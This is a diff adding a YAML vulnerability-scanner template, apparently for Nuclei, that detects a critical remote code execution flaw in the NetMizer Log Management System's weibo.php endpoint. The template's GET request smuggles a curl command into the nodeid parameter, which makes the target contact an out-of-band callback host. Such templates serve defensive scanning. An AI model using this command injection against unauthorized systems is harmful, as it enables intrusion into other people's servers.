@@ -1,0 +1,30 @@
+id: netmizer-log-ms-weibo-php-rce
+info:
+  name: NetMizer Log Management System weibo.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+  description: |
+    NetMizer Log Management System's weibo.php endpoint is vulnerable to remote code execution via specially crafted input.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /data/search/weibo.php?action=file&nodeid=;curl+{{reverse}}+%23+ HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
